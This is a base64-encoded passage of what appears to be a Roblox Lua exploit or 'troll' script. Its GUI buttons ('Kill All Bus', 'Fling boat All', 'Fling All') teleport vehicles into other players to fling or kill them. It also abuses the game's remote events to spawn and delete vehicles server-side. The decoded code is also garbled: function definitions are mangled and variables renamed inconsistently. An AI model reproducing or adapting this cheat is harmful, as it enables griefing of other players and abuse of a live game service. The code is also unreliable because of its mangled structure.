UCA9IDllOTAwCiAgICAgICAgICAgIGJ2LlBhcmVudCA9IEJhbGwKCiAgICAgICAgICAgIHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNhbWVyYVN1YmplY3QgPSB0aHVtCgogICAgICAgICAgICByZXBlYXQKICAgICAgICAgICAgICAgIGlmIHRyb290LlZlbG9jaXR5Lk1hZ25pdHVkZSA+IDAgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl84Y3htaGkgPSB0cm9vdC5Qb3NpdGlvbiArICh0cm9vdC5WZWxvY2l0eSAvIDEuNSkKICAgICAgICAgICAgICAgICAgICBCYWxsLkNGcmFtZSA9IENGcmFtZS5uZXcocG9zKQogICAgICAgICAgICAgICAgICAgIEJhbGwuT3JpZW50YXRpb24gKz0gVmVjdG9yMy5uZXcoNDUsIDYwLCAzMCkKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBmb3IgaSwgdiBpbiBwYWlycyh0Y2hhcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiB2OklzQSgiQmFzZVBhcnQiKSBhbmQgdi5DYW5Db2xsaWRlIGFuZCBub3Qgdi5BbmNob3JlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYWxsLkNGcmFtZSA9IHYuQ0ZyYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMS82MDAwKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgdGFzay53YWl0KDEvNjAwMCkKICAgICAgICAgICAgdW50aWwgdHJvb3QuVmVsb2NpdHkuTWFnbml0dWRlID4gMTAwMCBvciB0aHVtLkhlYWx0aCA8PSAwIG9yIG5vdCB0Y2hhcjpJc0Rlc2NlbmRhbnRPZih3b3Jrc3BhY2UpIG9yIHRhcmdldC5QYXJlbnQgfj0gcGxheWVycwoKICAgICAgICAgICAgd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ2FtZXJhU3ViamVjdCA9IGh1bWFub2lkCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgotLSBUb3VjaCBzY3JlZW4gdG8gYXBwbHkgYmFsbAp1c2VySW5wdXQuVG91Y2hUYXA6Q29ubmVjdChmdW5jdGlvbih0b3VjaGVzLCBwcm9jZXNzZWQpCglpZiBub3QgdG9vbEVxdWlwcGVkIG9yIHByb2Nlc3NlZCB0aGVuIHJldHVybiBlbmQKCWxvY2FsIHZhcl9xcm40dTAgPSB0b3VjaGVzWzFdCglsb2NhbCB2YXJfMHV2aWJlID0gY2FtZXJhOlNjcmVlblBvaW50VG9SYXkocG9zLlgsIHBvcy5ZKQoJbG9jYWwgdmFyX3JteXN4bSA9IHdvcmxkOlJheWNhc3QocmF5Lk9yaWdpbiwgcmF5LkRpcmVjdGlvbiAqIDEwMDApCglpZiBoaXQgYW5kIGhpdC5JbnN0YW5jZSB0aGVuCgkJbG9jYWwgdmFyXzl1aWN4bSA9IGhpdC5JbnN0YW5jZTpGaW5kRmlyc3RBbmNlc3Rvck9mQ2xhc3MoIk1vZGVsIikKCQlsb2NhbCB2YXJfZDdwMm5mID0gcGxheWVyczpHZXRQbGF5ZXJGcm9tQ2hhcmFjdGVyKG1vZGVsKQoJCWlmIHBsYXllciBhbmQgcGxheWVyIH49IGxvY2FsUGxheWVyIHRoZW4KCQkJRmxpbmdCYWxsKHBsYXllcikKCQllbmQKCWVuZAplbmQpCgplbmQKfSkKCmxvY2FsIHZhcl9iazVxZjkgPSBUcm9sbDpBZGRTZWN0aW9uKHtOYW1lID0gImtpbGwgQWxsIn0pCgpUcm9sbDpBZGRCdXR0b24oewogICAgTmFtZSA9ICJLaWxsIEFsbCBCdXMiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgdmFyX3JnMGgyMCA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIHZhcl80MGd4MGogPSBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpCmxvY2FsIHZhcl95bnJmejIgPSBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKQpsb2NhbCB2YXJfenBmN2J1ID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpCgpsb2NhbCB2YXJfNG82Z2lzID0gVmVjdG9yMy5uZXcoMTQ1LjUxLCAtMzc0LjA5LCAyMS41OCkgCmxvY2FsIHZhcl8yeW0xOGggPSBuaWwgIAoKbG9jYWwgdmFyXzJ3bGloZCBHZXRCdXMoKSAgCiAgICBsb2NhbCB2YXJfY3FiczBsID0gV29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKCJWZWhpY2xlcyIpICAKICAgIGlmIHZlaGljbGVzIHRoZW4gIAogICAgICAgIHJldHVybiB2ZWhpY2xlczpGaW5kRmlyc3RDaGlsZChQbGF5ZXJzLkxvY2FsUGxheWVyLk5hbWUuLiJDYXIiKSAgCiAgICBlbmQgIAogICAgcmV0dXJuIG5pbCAgCmVuZCAgCgpsb2NhbCB2YXJfdHBwaXlrIFRyYWNrUGxheWVyKHNlbGVjdGVkUGxheWVyTmFtZSwgY2FsbGJhY2spCiAgICB3aGlsZSB0cnVlIGRvICAKICAgICAgICBpZiBzZWxlY3RlZFBsYXllck5hbWUgdGhlbiAgCiAgICAgICAgICAgIGxvY2FsIHZhcl80NmNta3ogPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKHNlbGVjdGVkUGxheWVyTmFtZSkgIAogICAgICAgICAgICBpZiB0YXJnZXRQbGF5ZXIgYW5kIHRhcmdldFBsYXllci5DaGFyYWN0ZXIgYW5kIHRhcmdldFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuICAKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9teWM3dHUgPSB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKSAgCiAgICAgICAgICAgICAgICBpZiB0YXJnZXRIdW1hbm9pZCBhbmQgdGFyZ2V0SHVtYW5vaWQuU2l0IHRoZW4gIAogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl92NHlpdDYgPSBHZXRCdXMoKQogICAgICAgICAgICAgICAgICAgIGlmIGJ1cyB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGJ1czpTZXRQcmltYXJ5UGFydENGcmFtZShDRnJhbWUubmV3KGRlc3RpbmF0aW9uKSkgICAKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlBsYXllciBzYXQgZG93biwgdGFraW5nIGJ1cyB0byB0aGUgdm9pZCEiKSAgCgogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4yKSAgCgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfaXNqcmg0IHNpbXVsYXRlSnVtcCgpICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl82Y2F2N2YgPSBQbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRXaGljaElzQSgiSHVtYW5vaWQiKSAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBodW1hbm9pZCB0aGVuICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBodW1hbm9pZDpDaGFuZ2VTdGF0ZShFbnVtLkh1bWFub2lkU3RhdGVUeXBlLkp1bXBpbmcpICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCAgCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCAgCgogICAgICAgICAgICAgICAgICAgICAgICBzaW11bGF0ZUp1bXAoKSAgCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJTaW11bGF0aW5nIGZpcnN0IGp1bXAhIikgIAoKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNCkgIAogICAgICAgICAgICAgICAgICAgICAgICBzaW11bGF0ZUp1bXAoKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiU2ltdWxhdGluZyBzZWNvbmQganVtcCEiKSAgCgogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICAgICAgICAgICAgICBpZiBvcmlnaW5hbFBvc2l0aW9uIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gb3JpZ2luYWxQb3NpdGlvbiAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiUGxheWVyIHJldHVybmVkIHRvIGluaXRpYWwgcG9zaXRpb24uIikgIAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfZXJnOWhoID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsxXSA9ICJEZWxldGVBbGxWZWhpY2xlcyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiUkUiKTpXYWl0Rm9yQ2hpbGQoIjFDYTFyIik6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiQWxsIHZlaGljbGVzIHdlcmUgZGVsZXRlZCEiKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBicmVhayAgCiAgICAgICAgICAgICAgICBlbHNlICAKICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfMDNuYXNzID0gdGFyZ2V0UGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0ICAKICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfcWs2cjJ1ID0gdGljaygpICogMzUKICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyX3A3YXlwYSA9IG1hdGguc2luKHRpbWUpICogMTAgIC0tIEZhc3QgbGF0ZXJhbCBtb3ZlbWVudCAgCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyXzBvZDBlZSA9IG1hdGguY29zKHRpbWUpICogMjAgIC0tIEZyb250L2JhY2sgbW92ZW1lbnQKICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl85M2cxbW0gPSBHZXRCdXMoKQogICAgICAgICAgICAgICAgICAgIGlmIGJ1cyB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGJ1czpTZXRQcmltYXJ5UGFydENGcmFtZSh0YXJnZXRSb290LkNGcmFtZSAqIENGcmFtZS5uZXcoMCwgMCwgZnJvbnRCYWNrT2Zmc2V0KSkgIAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kICAKICAgICAgICAgICAgZW5kICAKICAgICAgICBlbmQgIAogICAgICAgIFJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpXYWl0KCkgIAogICAgZW5kCiAgICAKICAgIGlmIGNhbGxiYWNrIHRoZW4KICAgICAgICBjYWxsYmFjaygpCiAgICBlbmQKZW5kICAKCmxvY2FsIHZhcl8wc2Y2NGggU3RhcnRLaWxsQnVzKHBsYXllck5hbWUsIGNhbGxiYWNrKQogICAgbG9jYWwgdmFyX2N2bm9wNSA9IHBsYXllck5hbWUKCiAgICBsb2NhbCB2YXJfdG01NnVuID0gUGxheWVycy5Mb2NhbFBsYXllciAgCiAgICBsb2NhbCB2YXJfb2g2aWU3ID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpICAKICAgIGxvY2FsIHZhcl8weWpsd2ogPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgIAoKICAgIG9yaWdpbmFsUG9zaXRpb24gPSBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSAgCgogICAgbG9jYWwgdmFyX3Rjc24xMyA9IEdldEJ1cygpICAKCiAgICBpZiBub3QgYnVzIHRoZW4gIAogICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygxMTE4LjgxLCA3NS45OTgsIC0xMTM4LjYxKSAgCiAgICAgICAgdGFzay53YWl0KDAuNSkgIAogICAgICAgIGxvY2FsIHZhcl80cnEzNDIgPSBSZXBsaWNhdGVkU3RvcmFnZTpGaW5kRmlyc3RDaGlsZCgiUkUiKSAgCiAgICAgICAgaWYgcmVtb3RlRXZlbnQgYW5kIHJlbW90ZUV2ZW50OkZpbmRGaXJzdENoaWxkKCIxQ2ExciIpIHRoZW4gIAogICAgICAgICAgICByZW1vdGVFdmVudFsiMUNhMXIiXTpGaXJlU2VydmVyKCJQaWNraW5nQ2FyIiwgIlNjaG9vbEJ1cyIpICAKICAgICAgICBlbmQgIAogICAgICAgIHRhc2sud2FpdCgxKSAgCiAgICAgICAgYnVzID0gR2V0QnVzKCkgIAogICAgZW5kICAKCiAgICBpZiBidXMgdGhlbiAgCiAgICAgICAgbG9jYWwgdmFyX2xpczN0byA9IGJ1czpGaW5kRmlyc3RDaGlsZCgiQm9keSIpIGFuZCBidXMuQm9keTpGaW5kRmlyc3RDaGlsZCgiVmVoaWNsZVNlYXQiKSAgCiAgICAgICAgaWYgc2VhdCBhbmQgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKSBhbmQgbm90IGNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgdGhlbiAgCiAgICAgICAgICAgIHJlcGVhdCAgCiAgICAgICAgICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IHNlYXQuQ0ZyYW1lICogQ0ZyYW1lLm5ldygwLCAyLCAwKSAgCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoKSAgCiAgICAgICAgICAgIHVudGlsIGNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgb3Igbm90IGJ1cy5QYXJlbnQgIAogICAgICAgIGVuZCAgCiAgICBlbmQgIAoKICAgIHNwYXduKGZ1bmN0aW9uKCkKICAgICAgICBUcmFja1BsYXllcihzZWxlY3RlZFBsYXllck5hbWUsIGNhbGxiYWNrKQogICAgZW5kKQplbmQKCmxvY2FsIHZhcl93cXBnamIgUGVyZm9ybUFjdGlvbkZvckFsbFBsYXllcnMocGxheWVycykKICAgIGlmICNwbGF5ZXJzID09IDAgdGhlbgogICAgICAgIHJldHVybgogICAgZW5kCgogICAgbG9jYWwgdmFyX215bzlicSA9IHRhYmxlLnJlbW92ZShwbGF5ZXJzLCAxKQogICAgaWYgcGxheWVyIH49IFBsYXllcnMuTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgIFN0YXJ0S2lsbEJ1cyhwbGF5ZXIuTmFtZSwgZnVuY3Rpb24oKQogICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICBQZXJmb3JtQWN0aW9uRm9yQWxsUGxheWVycyhwbGF5ZXJzKQogICAgICAgIGVuZCkKICAgIGVsc2UKICAgICAgICBQZXJmb3JtQWN0aW9uRm9yQWxsUGxheWVycyhwbGF5ZXJzKSAtLSBTa2lwIHNlbGYgYW5kIG1vdmUgdG8gdGhlIG5leHQKICAgIGVuZAplbmQKClBlcmZvcm1BY3Rpb25Gb3JBbGxQbGF5ZXJzKFBsYXllcnM6R2V0UGxheWVycygpKQogICAgZW5kCn0pCnByaW50KCJLaWxsIEFsbCBCdXMgYnV0dG9uIGNyZWF0ZWQiKQoKVHJvbGw6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiRmxpbmcgYm9hdCBBbGwiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgdmFyXzd0dHVvaCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgbG9jYWwgdmFyXzRndzVwNSA9IFBsYXllci5DaGFyYWN0ZXIKICAgIGxvY2FsIHZhcl9uZjUwNGUgPSBDaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICBsb2NhbCB2YXJfajQzaTRiID0gQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgIGxvY2FsIHZhcl9zdjBxZzUgPSBnYW1lLldvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiVmVoaWNsZXMiKQogICAgbG9jYWwgdmFyXzR5anh3YiA9IFJvb3RQYXJ0LkNGcmFtZQogICAgbG9jYWwgdmFyX2E3bzNtciA9IDAKICAgIGxvY2FsIHZhcl9nNWp5d3AgPSBWZWhpY2xlczpGaW5kRmlyc3RDaGlsZChQbGF5ZXIuTmFtZS4uIkNhciIpCiAgICAKICAgIC0tIElmIG5vIGNhciwgY3JlYXRlIG9uZQogICAgICAgICAgICBpZiBub3QgUENhciB0aGVuICAKICAgICAgICAgICAgICAgIGlmIFJvb3RQYXJ0IHRoZW4gIAogICAgICAgICAgICAgICAgICAgIFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoMTc1NCwgLTIsIDU4KSAgCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkgIAogICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SRTpGaW5kRmlyc3RDaGlsZCgiMUNhMXIiKTpGaXJlU2VydmVyKCJQaWNraW5nQm9hdCIsICJNaWxpdGFyeUJvYXRGcmVlIikgIAogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpICAKICAgICAgICAgICAgICAgICAgICBQQ2FyID0gVmVoaWNsZXM6RmluZEZpcnN0Q2hpbGQoUGxheWVyLk5hbWUuLiJDYXIiKSAgCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkgIAogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl8wY2U1bmogPSBQQ2FyOkZpbmRGaXJzdENoaWxkKCJCb2R5IikgYW5kIFBDYXIuQm9keTpGaW5kRmlyc3RDaGlsZCgiVmVoaWNsZVNlYXQiKSAgCiAgICAgICAgICAgICAgICAgICAgaWYgU2VhdCB0aGVuICAKICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0ICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJvb3RQYXJ0LkNGcmFtZSA9IFNlYXQuQ0ZyYW1lICogQ0ZyYW1lLm5ldygwLCBtYXRoLnJhbmRvbSgtMSwgMSksIDApICAKICAgICAgICAgICAgICAgICAgICAgICAgdW50aWwgSHVtYW5vaWQuU2l0ICAKICAgICAgICAgICAgICAgICAgICBlbmQgIAogICAgICAgICAgICAgICAgZW5kICAKICAgICAgICAgICAgZW5kICAKICAgICAgCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpICAKICAgICAgICAgICAgUENhciA9IFZlaGljbGVzOkZpbmRGaXJzdENoaWxkKFBsYXllci5OYW1lLi4iQ2FyIikgIAogICAgICAKICAgICAgICAgICAgLS0gSWYgdGhlIGNhciBleGlzdHMsIHRlbGVwb3J0IHRvIHRoZSBzZWF0IGlmIG5lY2Vzc2FyeQogICAgICAgICAgICBpZiBQQ2FyIHRoZW4gIAogICAgICAgICAgICAgICAgaWYgbm90IEh1bWFub2lkLlNpdCB0aGVuICAKICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfcXF0OTN6ID0gUENhcjpGaW5kRmlyc3RDaGlsZCgiQm9keSIpIGFuZCBQQ2FyLkJvZHk6RmluZEZpcnN0Q2hpbGQoIlZlaGljbGVTZWF0IikgIAogICAgICAgICAgICAgICAgICAgIGlmIFNlYXQgdGhlbiAgCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKSAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBSb290UGFydC5DRnJhbWUgPSBTZWF0LkNGcmFtZSAqIENGcmFtZS5uZXcoMCwgbWF0aC5yYW5kb20oLTEsIDEpLCAwKSAgCiAgICAgICAgICAgICAgICAgICAgICAgIHVudGlsIEh1bWFub2lkLlNpdCAgCiAgICAgICAgICAgICAgICAgICAgZW5kICAKICAgICAgICAgICAgICAgIGVuZCAgCiAgICAgICAgICAgIGVuZCAgCiAgICAgIAogICAgICAgICAgICAtLSBBZGQgQm9keUd5cm8gdG8gdGhlIGNhciBmb3IgbW92ZW1lbnQgY29udHJvbAogICAgICAgICAgICBsb2NhbCB2YXJfYjgzdGNkID0gSW5zdGFuY2UubmV3KCJCb2R5R3lybyIpICAKICAgICAgICAgICAgU3Bpbkd5cm8uUGFyZW50ID0gUENhci5QcmltYXJ5UGFydCAgCiAgICAgICAgICAgIFNwaW5HeXJvLk1heFRvcnF1ZSA9IFZlY3RvcjMubmV3KDFlNywgMWU3LCAxZTcpICAKICAgICAgICAgICAgU3Bpbkd5cm8uUCA9IDFlNyAgCiAgICAgICAgICAgIFNwaW5HeXJvLkNGcmFtZSA9IFBDYXIuUHJpbWFyeVBhcnQuQ0ZyYW1lICogQ0ZyYW1lLkFuZ2xlcygwLCBtYXRoLnJhZCg5MCksIDApICAKICAgICAgCiAgICAgICAgICAgIC0tIEZsaW5nIGZ1bmN0aW9uIGZvciBlYWNoIHBsYXllciBmb3IgMyBzZWNvbmRzCiAgICAgICAgICAgIGxvY2FsIHZhcl94dWY4Y2sgZmxpbmdQbGF5ZXIoVGFyZ2V0QywgVGFyZ2V0UlAsIFRhcmdldEgpCiAgICBBbmdsZXMgPSAwICAKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl95emFhOWkgPSB0aWNrKCkgKyAxICAtLSBTZXQgZW5kIHRpbWUgdG8gMiBzZWNvbmRzIGZyb20gbm93CiAgICAgICAgICAgICAgICB3aGlsZSB0aWNrKCkgPCBlbmRUaW1lIGRvICAKICAgICAgICAgICAgICAgICAgICBBbmdsZXMgPSBBbmdsZXMgKyAxMjQ4NTQ3NjAgIAogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpICAKICAgICAgCiAgICAgICAgICAgICAgICAgICAgLS0gTW92ZW1lbnRzIGFuZCBhbmdsZXMgZm9yIHRoZSBGbGluZwogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9nNDZyNTIgPSBmdW5jdGlvbih0YXJnZXQsIHBvcywgYW5nbGUpICAKICAgICAgICAgICAgICAgICAgICAgICAgUENhcjpTZXRQcmltYXJ5UGFydENGcmFtZShDRnJhbWUubmV3KHRhcmdldC5Qb3NpdGlvbikgKiBwb3MgKiBhbmdsZSkgIAogICAgICAgICAgICAgICAgICAgIGVuZCAgCiAgICAgIAogICAgICAgICAgICAgICAgICAgIC0tIEZsaW5nIHRvIHZhcmlvdXMgcG9zaXRpb25zIGFyb3VuZCB0aGUgVGFyZ2V0UlAKICAgICAgICAgICAgICAgICAgICBraWxsKFRhcmdldFJQLCBDRnJhbWUubmV3KDAsIDMsIDApLCBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKEFuZ2xlcyksIDAsIDApKSAgCiAgICAgICAgICAgICAgICAgICAga2lsbChUYXJnZXRSUCwgQ0ZyYW1lLm5ldygwLCAtMS45LCAyKSwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZXMpLCAwLCAwKSkgIAogICAgICAgICAgICAgICAgICAgIGtpbGwoVGFyZ2V0UlAsIENGcmFtZS5uZXcoMiwgMS41LCAyLjI1KSwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZCg1MCksIDAsIDApKSAgCiAgICAgICAgICAgICAgICAgICAga2lsbChUYXJnZXRSUCwgQ0ZyYW1lLm5ldygtMy45MCwgLTIuNSwgOC4yNSksIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoMzApLCAwLCAwKSkgIAogICAgICAgICAgICAgICAgICAgIGtpbGwoVGFyZ2V0UlAsIENGcmFtZS5uZXcoMCwgOS4wLCAwKSwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZXMpLCAwLCAwKSkgIAogICAgICAgICAgICAgICAgICAgIGtpbGwoVGFyZ2V0UlAsIENGcmFtZS5uZXcoMCwgLTkuNSwgMCksIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoQW5nbGVzKSwgMCwgMCkpICAKICAgICAgICAgICAgICAgIGVuZCAgCiAgICAgICAgICAgIGVuZCAgCiAgICAgIAogICAgICAgICAgICAtLSBJdGVyYXRlIG92ZXIgYWxsIHBsYXllcnMKICAgICAgICAgICAgZm9yIF8sIFRhcmdldCBpbiBwYWlycyhnYW1lLlBsYXllcnM6R2V0UGxheWVycygpKSBkbyAgCiAgICAgICAgICAgICAgICAtLSBTa2lwIHRoZSBsb2NhbCB2YXJfZWZubGlvCiAgICAgICAgICAgICAgICBpZiBUYXJnZXQgfj0gUGxheWVyIHRoZW4gIAogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl81a3I0dGYgPSBUYXJnZXQuQ2hhcmFjdGVyICAKICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfNXh4YXhjID0gVGFyZ2V0QyBhbmQgVGFyZ2V0QzpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikgIAogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl85czdqbnYgPSBUYXJnZXRDIGFuZCBUYXJnZXRDOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgIAogICAgICAKICAgICAgICAgICAgICAgICAgICAtLSBJZiB0aGUgdGFyZ2V0IGFuZCBpdHMgY29tcG9uZW50cyBhcmUgZm91bmQsIGV4ZWN1dGUgdGhlIGZsaW5nCiAgICAgICAgICAgICAgICAgICAgaWYgVGFyZ2V0QyBhbmQgVGFyZ2V0SCBhbmQgVGFyZ2V0UlAgdGhlbiAgCiAgICAgICAgICAgICAgICAgICAgICAgIGZsaW5nUGxheWVyKFRhcmdldEMsIFRhcmdldFJQLCBUYXJnZXRIKSAgLS0gRmxpbmcgdGhlIGN1cnJlbnQgcGxheWVyCiAgICAgICAgICAgICAgICAgICAgZW5kICAKICAgICAgICAgICAgICAgIGVuZCAgCiAgICAgICAgICAgIGVuZCAgCiAgICAgIAogICAgICAgICAgICAtLSBSZXR1cm4gdGhlIHBsYXllciB0byB0aGVpciBvcmlnaW5hbCBwb3NpdGlvbgogICAgICAgICAgICB0YXNrLndhaXQoMC41KSAgCiAgICAgICAgICAgIFBDYXI6U2V0UHJpbWFyeVBhcnRDRnJhbWUoQ0ZyYW1lLm5ldygwLCAwLCAwKSkgIAogICAgICAgICAgICB0YXNrLndhaXQoMC41KSAgCiAgICAgICAgICAgIEh1bWFub2lkLlNpdCA9IGZhbHNlICAKICAgICAgICAgICAgdGFzay53YWl0KDAuNSkgIAogICAgICAgICAgICBSb290UGFydC5DRnJhbWUgPSBPbGRQb3MgIAogICAgICAKICAgICAgICAgICAgLS0gUmVtb3ZlIHRoZSBCb2R5R3lybyBhZnRlciB0aGUgZWZmZWN0CiAgICAgICAgICAgIFNwaW5HeXJvOkRlc3Ryb3koKSAgCiAgICBlbmQKfSkKcHJpbnQoIkZsaW5nIEJvYXQgQWxsIGJ1dHRvbiBjcmVhdGVkIikKClRyb2xsOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkZsaW5nIEFsbCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgIGxvY2FsIHZhcl93d3ZqdHogPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQogICAgbG9jYWwgdmFyX3VvbmpnNiA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKQogICAgbG9jYWwgdmFyX3VxOWdmaSA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIHZhcl9yMXVja2wgPSB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYQoKCiAgICBsb2NhbCB2YXJfOWZzem1kIFByb2Nlc3NQbGF5ZXIodGFyZ2V0KQogICAgICAgIGlmIG5vdCB0YXJnZXQgb3Igbm90IHRhcmdldC5DaGFyYWN0ZXIgb3IgdGFyZ2V0ID09IExvY2FsUGxheWVyIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIHZhcl9hMjJhM3UgPSB0cnVlCiAgICAgICAgbG9jYWwgdmFyXzFwa3B3ayA9IExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBsb2NhbCB2YXJfb2w4aHQ2ID0gdGFyZ2V0LkNoYXJhY